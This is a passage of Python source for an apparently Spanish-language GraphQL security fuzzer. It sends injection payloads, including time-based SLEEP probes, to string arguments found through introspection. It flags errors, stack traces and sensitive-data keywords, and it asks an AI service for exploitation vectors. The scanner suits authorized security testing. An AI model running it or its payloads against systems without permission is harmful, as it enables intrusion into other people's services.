                    if self.configuracion.verbose: print(f"{Fore.YELLOW}[!] 'fields' no es lista en tipo {tipo_nombre}")
                    continue # Saltar si 'args' no es una lista

                for campo in campos:
                    # Asegurar que cada campo es un diccionario
                    if not isinstance(campo, dict):
                        if self.configuracion.verbose: print(f"{Fore.YELLOW}[!] Elemento no-dict encontrado en 'fields' de tipo {tipo_nombre}")
                        continue # Saltar este campo

                    nombre_campo = campo.get('name')
                    # Saltar si no hay nombre o es de introspección
                    if not nombre_campo or nombre_campo.startswith('__'): continue

                    argumentos = campo.get('args')
                    # Verificar que 'args' sea una lista (puede estar vacía)
                    if not isinstance(argumentos, list):
                        # Es normal no tener args, no imprimir warning a menos que verbose
                        if self.configuracion.verbose: print(f"{Fore.YELLOW}[!] 'args' no es lista en campo {nombre_campo}")
                        continue # Saltar si 'args' no es una lista

                    for arg in argumentos:
                        # Asegurar que cada argumento es un diccionario
                        if not isinstance(arg, dict):
                            if self.configuracion.verbose: print(f"{Fore.YELLOW}[!] Elemento no-dict encontrado en 'args' de campo {nombre_campo}")
                            continue # Saltar este argumento

                        nombre_arg = arg.get('name')
                        tipo_arg = arg.get('type') # Obtener el tipo (puede ser None)

                        # Saltar si falta información crucial
                        if not nombre_arg or not isinstance(tipo_arg, dict): # tipo_arg DEBE ser un diccionario para proceder
                            continue

                        # --- Bloque Robusto 'ofType' ---
                        tipo_base = tipo_arg
                        iter_count = 0
                        # Bucle seguro: verificar que tipo_base es dict ANTES de llamar a get
                        while isinstance(tipo_base, dict) and tipo_base.get('ofType') is not None and iter_count < 10:
                            tipo_base = tipo_base.get('ofType')
                            iter_count += 1

                        # Verificar que tipo_base NO es None y ES un diccionario ANTES de usar get
                        if isinstance(tipo_base, dict):
                            kind = tipo_base.get('kind')
                            name = tipo_base.get('name')
                            # Verificar que kind y name no sean None antes de comparar
                            if kind == 'SCALAR' and name == 'String':
                                # print(f"{Fore.GREEN}[+] Argumento String candidato: {nombre_campo}.{nombre_arg}") # Opcional
                                campos_a_probar.append({
                                    'nombre_campo': nombre_campo,
                                    'nombre_arg': nombre_arg,
                                    'es_mutacion': tipo_nombre == tipo_mutacion_nombre
                                })
                    # --- Fin Bloque Robusto ---
        # --- Fin Recolección ---

        if not campos_a_probar:
            print(f"{Fore.CYAN}[*]   No se encontraron argumentos de tipo String para probar inyección en {punto_final}")
            return

        print(f"{Fore.CYAN}[*]   Probando inyecciones en {len(campos_a_probar)} argumento(s) String encontrados...")

        # --- Bucle de Envío de Payloads ---
        for item in campos_a_probar:
            nombre_campo = item['nombre_campo']
            nombre_arg = item['nombre_arg']
            es_mutacion = item['es_mutacion']

            for tipo_inyeccion, payloads in payloads_inyeccion.items():
                for payload in payloads:
                    try:
                        # Escapar payload para JSON
                        payload_escapado = json.dumps(payload)[1:-1]
                        argumento_str = f'{nombre_arg}: "{payload_escapado}"'

                        # Construir query/mutation
                        tipo_op = "mutation" if es_mutacion else "query"
                        # Intentar obtener campos comunes si es posible, si no, 'id' o 'success'
                        # (Esta parte podría mejorarse analizando el tipo de retorno del campo)
                        campos_retorno = "success" if es_mutacion else "id"
                        query_completa = f"{tipo_op} {{ {nombre_campo}({argumento_str}) {{ {campos_retorno} }} }}"

                        start_time = time.time()
                        respuesta = self.sesion.post(punto_final, json={"query": query_completa}, timeout=self.configuracion.tiempo_espera)
                        duration = time.time() - start_time

                        # --- Análisis de Respuesta Robusto ---
                        # 1. Time-based
                        if duration > (self.configuracion.tiempo_espera * 0.7):
                            if "SLEEP" in payload:
                                # ... (código de reporte de vulnerabilidad time-based) ...
                                vulnerabilidad = {
                                    'punto_final': punto_final, 'tipo': f'Posible Inyección {tipo_inyeccion} basada en Tiempo',
                                    'detalle': f"Payload '{payload}' en arg '{nombre_arg}' de '{nombre_campo}' causó retraso ({duration:.2f}s).",
                                    'carga_util': {"query": query_completa}, 'severidad': 'Alta' }
                                print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                                self.resultados.vulnerabilidades.append(vulnerabilidad)
                                # ¡IMPORTANTE! Asegúrate que _enviar_notificacion maneja errores y asincronía
                                self._enviar_notificacion(f"🚨 ALERTA DE SEGURIDAD (INYECCIÓN): {vulnerabilidad['detalle']} en {punto_final}")

                        # 2. Error-based
                        if respuesta.status_code == 500 or respuesta.status_code == 400:
                            try:
                                datos_resp = respuesta.json()
                                # Verificar estructura de errores
                                if isinstance(datos_resp.get('errors'), list):
                                    for error in datos_resp['errors']:
                                        if isinstance(error, dict):
                                            msg_error = error.get('message', '')
                                            # Palabras clave de error sensibles
                                            if isinstance(msg_error, str) and any(kw in msg_error.lower() for kw in ['sql syntax', 'unterminated', 'command not found', 'template error', 'unexpected token', 'resolver error', 'database error']):
                                                # ... (código de reporte de vulnerabilidad error-based) ...
                                                vulnerabilidad = {
                                                    'punto_final': punto_final, 'tipo': f'Posible Inyección {tipo_inyeccion} (Error Detectado)',
                                                    'detalle': f"Payload '{payload}' en arg '{nombre_arg}' de '{nombre_campo}' generó error: {msg_error[:100]}...",
                                                    'carga_util': {"query": query_completa}, 'respuesta': json.dumps(datos_resp, indent=2), 'severidad': 'Alta' }
                                                print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                                                self.resultados.vulnerabilidades.append(vulnerabilidad)
                                                # ¡IMPORTANTE! Asegúrate que _enviar/_obtener manejan errores y asincronía
                                                self._enviar_notificacion(f"🚨 ALERTA DE SEGURIDAD (INYECCIÓN): {vulnerabilidad['detalle']} en {punto_final}")
                                                if self.configuracion.clave_api_mistral:
                                                    # ¡IMPORTANTE! Asegúrate que _obtener_analisis_ia maneja errores
                                                    analisis = self._obtener_analisis_ia(f"Un payload de inyección '{payload}' en el argumento '{nombre_arg}' del campo '{nombre_campo}' en {punto_final} produjo un error sospechoso: {msg_error[:250]}... ¿Implicaciones y vectores de ataque? enumeralas del uno al 3 comenzando con este emoji cada un 🔍 y luego utiliza un breve ejemplos si es necesario.")
                                                    if analisis: # Verificar si hubo respuesta de la IA
                                                        print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")
                                            break # Reportar solo un error por payload
                            except json.JSONDecodeError:
                                if self.configuracion.verbose: print(f"{Fore.YELLOW}[!] Respuesta no JSON con status {respuesta.status_code} para payload de inyección.")
                            except Exception as json_ex: # Capturar otros posibles errores del análisis JSON/Error
                                print(f"{Fore.RED}[CRITICAL] Error analizando respuesta JSON/Error para {nombre_campo}.{nombre_arg}: {json_ex}")


                    except requests.exceptions.Timeout:
                        if "SLEEP" in payload:
                            # ... (código de reporte de vulnerabilidad timeout + time-based) ...
                            vulnerabilidad = {
                                'punto_final': punto_final, 'tipo': f'Posible Inyección {tipo_inyeccion} basada en Tiempo (Timeout)',
                                'detalle': f"Payload de tiempo '{payload}' en arg '{nombre_arg}' de '{nombre_campo}' excedió el timeout.",
                                'carga_util': {"query": query_completa}, 'severidad': 'Alta' }
                            print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                            self.resultados.vulnerabilidades.append(vulnerabilidad)
                        self._enviar_notificacion(f"🚨 ALERTA DE SEGURIDAD (INYECCIÓN): {vulnerabilidad['detalle']} en {punto_final}")

                    except requests.exceptions.RequestException as e:
                            if self.configuracion.verbose:
                                print(f"{Fore.YELLOW}[!] Error de red probando inyección ({tipo_inyeccion}) en {punto_final} para {nombre_campo}.{nombre_arg}: {e}")
                    except Exception as general_ex: # Captura genérica para cualquier otro error inesperado
                            print(f"{Fore.RED}[CRITICAL] Error inesperado procesando payload para {nombre_campo}.{nombre_arg}: {general_ex}")
                            import traceback
                            traceback.print_exc() # Imprime el traceback completo para depurar

        print(f"{Fore.CYAN}[*] Pruebas de inyección en argumentos completadas para {punto_final}")
 


    def _analizar_respuesta(self, punto_final, carga_util, respuesta):
        """Analizar una respuesta de GraphQL en busca de posibles vulnerabilidades."""
        try:
            # Verificar si la respuesta contiene mensajes de error
            datos = respuesta.json()

            # Imprimir la respuesta completa para depuración
            print(f"{Fore.CYAN}[*] Respuesta completa para {punto_final} con carga útil {carga_util}:")
            print(json.dumps(datos, indent=4))

            # Buscar mensajes de error que puedan indicar vulnerabilidades
            if 'errors' in datos and isinstance(datos['errors'], list):
                for error in datos['errors']:
                    if isinstance(error, dict) and 'message' in error:
                        mensaje_error = error['message'].lower()

                        # Divulgación de errores de base de datos
                        terminos_db = ['sql', 'database', 'syntax', 'mongodb', 'query failed', 'unexpected token']
                        for termino in terminos_db:
                            if termino in mensaje_error:
                                vulnerabilidad = {
                                    'punto_final': punto_final,
                                    'tipo': 'Divulgación de Mensaje de Error',
                                    'detalle': f"Se divulgó un mensaje de error de base de datos: {error['message']}",
                                    'carga_util': carga_util,
                                    'severidad': 'Alta'
                                }
                                print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                                self.resultados.vulnerabilidades.append(vulnerabilidad)
                                self._enviar_notificacion(f"🚨 Problema de seguridad crítico: {vulnerabilidad['detalle']} en {punto_final}")

                                # Obtener análisis de IA
                                if self.configuracion.clave_api_mistral:
                                    analisis = self._obtener_analisis_ia(f"El punto final de GraphQL en {punto_final} divulgó un error de base de datos: {error['message']}. ¿Cuáles podrían ser las implicaciones de seguridad y cómo podría explotarse o vectores de ataque? enumeralas del uno al 3 comenzando con este emoji cada un 🔍 y luego utiliza un breve ejemplos si es necesario. ")
                                    print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")
                                break

                        # Divulgación de traza de pila
                        if any(termino in mensaje_error for termino in ['at ', 'line', 'stack', 'trace', 'file', '.js', '.py', '.php']):
                            vulnerabilidad = {
                                'punto_final': punto_final,
                                'tipo': 'Divulgación de Traza de Pila',
                                'detalle': f"Se divulgó una traza de pila de la aplicación: {error['message'][:100]}...",
                                'carga_util': carga_util,
                                'severidad': 'Media'
                            }
                            print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                            self.resultados.vulnerabilidades.append(vulnerabilidad)
                            self._enviar_notificacion(f"🚨 Problema de seguridad: {vulnerabilidad['detalle']} en {punto_final}")

                            # Obtener análisis de IA
                            if self.configuracion.clave_api_mistral:
                                analisis = self._obtener_analisis_ia(f"El punto final de GraphQL en {punto_final} divulgó una traza de pila: {error['message'][:250]}. ¿Cuáles podrían ser las implicaciones de seguridad o vectores de ataque? enumeralas del uno al 3 comenzando con este emoji cada un 🔍 y luego utiliza un breve ejemplos si es necesario. ")
                                print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")

            # Verificar si la introspección está habilitada
            if '__schema' in datos.get('data', {}) or 'types' in datos.get('data', {}).get('__schema', {}):
                vulnerabilidad = {
                    'punto_final': punto_final,
                    'tipo': 'Introspección Habilitada',
                    'detalle': "La introspección de GraphQL está habilitada, lo que expone la estructura de la API",
                    'carga_util': carga_util,
                    'severidad': 'Media'
                }
                print(f"{Fore.YELLOW}[!] {vulnerabilidad['detalle']} en {punto_final}")
                self.resultados.vulnerabilidades.append(vulnerabilidad)
                self._enviar_notificacion(f"⚠ Problema de seguridad: Introspección de GraphQL habilitada en {punto_final}")

            # Verificar la presencia de datos sensibles en la respuesta
            terminos_sensibles = [
                                    'password', 'token', 'secret', 'key', 'credit', 'ssn', 'social', 'private',
                                    'apikey', 'auth', 'session', 'cookie', 'credential', 'pin', 'otp', 'account',
                                    'wallet', 'balance', 'transaction', 'payment', 'card', 'cvv', 'expiry',
                                    'address', 'phone', 'mobile', 'email', 'username', 'userid', 'profile',
                                    'history', 'log', 'audit', 'backup', 'config', 'setting', 'environment',
                                    'database', 'schema', 'table', 'column', 'index', 'query', 'sql', 'nosql',
                                    'admin', 'superuser', 'root', 'sudo', 'privilege', 'role', 'permission',
                                    'encryption', 'hash', 'salt', 'certificate', 'cert', 'pem', 'rsa', 'dsa',
                                    'ssh', 'ftp', 'vpn', 'network', 'firewall', 'proxy', 'dns', 'ip', 'mac',
                                    'hostname', 'domain', 'subdomain', 'url', 'endpoint', 'path', 'route',
                                    'file', 'directory', 'path', 'storage', 'bucket', 'blob', 'object', 's3',
                                    'gcp', 'azure', 'aws', 'cloud', 'instance', 'vm', 'container', 'docker',
                                    'kubernetes', 'pod', 'namespace', 'service', 'ingress', 'deployment', 'job',
                                    'cronjob', 'secretmanager', 'vault', 'keystore', 'credentialstore', 'envvar'
                                ]
            texto_respuesta = json.dumps(datos).lower()
            for termino in terminos_sensibles:
                if termino in texto_respuesta:
                    vulnerabilidad = {
                        'punto_final': punto_final,
                        'tipo': 'Exposición de Datos Sensibles',
                        'detalle': f"La respuesta contiene datos potencialmente sensibles relacionados con '{termino}'",
                        'carga_util': carga_util,
                        'severidad': 'Crítica'
                    }
                    print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                    self.resultados.vulnerabilidades.append(vulnerabilidad)
                    self._enviar_notificacion(f"🚨 Problema de seguridad crítico: {vulnerabilidad['detalle']} en {punto_final}")

                    # Obtener análisis de IA
                    if self.configuracion.clave_api_mistral:
                        analisis = self._obtener_analisis_ia(f"El punto final de GraphQL en {punto_final} expuso datos sensibles relacionados con '{termino}'. ¿Cuáles podrían ser las implicaciones de seguridad o vectores de ataque? enumeralas del uno al 3 comenzando con este emoji cada un 🔍 y luego utiliza un breve ejemplos si es necesario. ")
                        print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")
                    break

        except (json.JSONDecodeError, KeyError, AttributeError):
            pass


    def _enviar_notificacion(self, mensaje):
        """Enviar notificación por Telegram (manejando asincronía y errores)."""
        if self.bot and self.id_chat_telegram:
            try:
                asyncio.run(self.bot.send_message(chat_id=self.id_chat_telegram, text=mensaje))
                if self.configuracion.verbose:
                    print(f"{Fore.GREEN}[+] Notificación de Telegram enviada.")
            except telegram.error.TelegramError as tg_error:
                print(f"{Fore.RED}[!] Error de Telegram al enviar notificación: {tg_error}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error general al enviar notificación por Telegram: {e}")
                

    def _obtener_analisis_ia(self, prompt):
        """Obtener análisis de IA de Mistral AI si está configurado."""
        if not self.configuracion.clave_api_mistral:
            return "Análisis de IA no configurado"

        try:
            encabezados = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Authorization": f"Bearer {self.configuracion.clave_api_mistral}"
            }

            carga_util = {
                "model": "mistral-medium",
                "messages": [
                    {"role": "system", "content": "Eres un experto en seguridad analizando vulnerabilidades de GraphQL. Proporciona un análisis conciso y posibles vectores de explotación. Y siempre responderás en español."},
                    {"role": "user", "content": prompt}
                ],
                "max_tokens": 150,
                "temperature": 0.3
            }

            respuesta = requests.post(
                "https://api.mistral.ai/v1/chat/completions",
                headers=encabezados,
                json=carga_util
            )

            if respuesta.status_code == 200:
                resultado = respuesta.json()
                return resultado["choices"][0]["message"]["content"]
            else:
                if self.configuracion.verbose:
                    print(f"{Fore.RED}[!] Error de la API de Mistral: {respuesta.status_code} - {respuesta.text}")
                return f"Error al obtener análisis de IA: la API devolvió el estado {respuesta.status_code}"

        except Exception as e:
            if self.configuracion.verbose:
                print(f"{Fore.RED}[!] Error al obtener análisis de IA: {e}")
            return "Error al obtener análisis de IA"

    def generar_informe(self):
        """Generar un informe completo de los hallazgos."""
        print(f"{Fore.BLUE}[*] Generando informe de seguridad para {self.url_base}")

        informe = {
            "objetivo": self.url_base,
            "fecha_escaneo": time.strftime("%Y-%m-%d %H:%M:%S"),
            "puntos_finales": self.resultados.puntos_finales_graphql,
            "vulnerabilidades": self.resultados.vulnerabilidades,
            "esquemas": list(self.resultados.esquemas.keys())
        }

        # Calcular el recuento de severidades
        recuento_severidades = {"Crítica": 0, "Alta": 0, "Media": 0, "Baja": 0, "Info": 0}
        for vulnerabilidad in self.resultados.vulnerabilidades:
            severidad = vulnerabilidad.get("severidad", "Info")
            if severidad in recuento_severidades:
                recuento_severidades[severidad] += 1

        informe["resumen"] = {
            "total_puntos_finales": len(self.resultados.puntos_finales_graphql),
            "total_vulnerabilidades": len(self.resultados.vulnerabilidades),
            "recuento_severidades": recuento_severidades
        }

        # Guardar el informe en un archivo
        nombre_archivo = f"informe_graphql_{urlparse(self.url_base).netloc}_{int(time.time())}.json"
        with open(nombre_archivo, "w") as f:
            json.dump(informe, f, indent=4)

        print(f"{Fore.GREEN}[+] Informe guardado en {nombre_archivo}")

        # Imprimir resumen
        print(f"\n{Fore.CYAN}==== RESUMEN DEL ESCANEO ====")
        print(f"{Fore.CYAN}Objetivo: {self.url_base}")
        print(f"{Fore.CYAN}Puntos finales de GraphQL: {len(self.resultados.puntos_finales_graphql)}")
        print(f"{Fore.CYAN}Vulnerabilidades encontradas: {len(self.resultados.vulnerabilidades)}")
        print(f"{Fore.CYAN}Desglose de severidades:")
        for severidad, cantidad in recuento_severidades.items():
            color = Fore.RED if severidad == "Crítica" else Fore.YELLOW if severidad == "Alta" else Fore.BLUE
            print(f"{color}  {severidad}: {cantidad}")

        # Enviar notificación con el resumen
        if self.bot and self.id_chat_telegram:
            texto_resumen = f"📊 Escaneo completado para {self.url_base}\n"
            texto_resumen += f"- Se encontraron {len(self.resultados.puntos_finales_graphql)} puntos finales de GraphQL\n"
            texto_resumen += f"- Se detectaron {len(self.resultados.vulnerabilidades)} vulnerabilidades\n"
            texto_resumen += "Desglose de severidades:\n"
            for severidad, cantidad in recuento_severidades.items():
                if cantidad > 0:
                    texto_resumen += f"  {severidad}: {cantidad}\n"

            self._enviar_notificacion(texto_resumen)

        return informe

def main():
    """Función principal para ejecutar el Fuzzer de GraphQL."""
    print(Fore.CYAN + BANNER)
    print(f"{Fore.CYAN}Fuzzer de Seguridad GraphQL v1.0\n")

    parser = argparse.ArgumentParser(description="Fuzzer de Seguridad GraphQL")
    parser.add_argument("-d", "--dominio", required=True, help="Dominio o URL objetivo")
    parser.add_argument("-t", "--hilos", type=int, default=10, help="Número de hilos (por defecto: 10)")
    parser.add_argument("--tiempo_espera", type=int, default=10, help="Tiempo de espera de la solicitud en segundos (por defecto: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Habilitar salida detallada")
    parser.add_argument("--clave_mistral", help="Clave de API de Mistral AI para análisis de IA")
    parser.add_argument("--token_telegram", help="Token del bot de Telegram para notificaciones")
    parser.add_argument("--id_chat_telegram", help="ID de chat de Telegram para notificaciones")
    parser.add_argument("--profundidad", type=int, default=3, help="Profundidad máxima de rastreo (por defecto: 3)")
    parser.add_argument("-o", "--salida", help="Archivo de salida para el informe (por defecto: generado automáticamente)")

    args = parser.parse_args()

    configuracion = Configuracion()
    configuracion.dominio = args.dominio
    configuracion.hilos = args.hilos
    configuracion.tiempo_espera = args.tiempo_espera
    configuracion.verbose = args.verbose
    configuracion.profundidad_maxima = args.profundidad

    if args.clave_mistral:
        configuracion.clave_api_mistral = args.clave_mistral

    if args.token_telegram and args.id_chat_telegram:
        configuracion.token_telegram = args.token_telegram
        configuracion.id_chat_telegram = args.id_chat_telegram

    fuzzer = FuzzerGraphQL(configuracion)

    try:
        # Descubrir puntos finales de GraphQL
        puntos_finales = fuzzer.descubrir_puntos_finales()

        if puntos_finales:
            # Fuzzear puntos finales descubiertos
            fuzzer.fuzzear_puntos_finales()

            # Generar y guardar el informe
            fuzzer.generar_informe()

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Escaneo interrumpido por el usuario")
        # Aún así generar el informe con resultados parciales
        fuzzer.generar_informe()
    except Exception as e:
        print(f"{Fore.RED}[!] Error durante el escaneo: {e}")
        if configuracion.verbose:
            import traceback
            traceback.print_exc()

    print(f"{Fore.CYAN}[*] Escaneo completado")

if __name__ == "__main__":
    main()
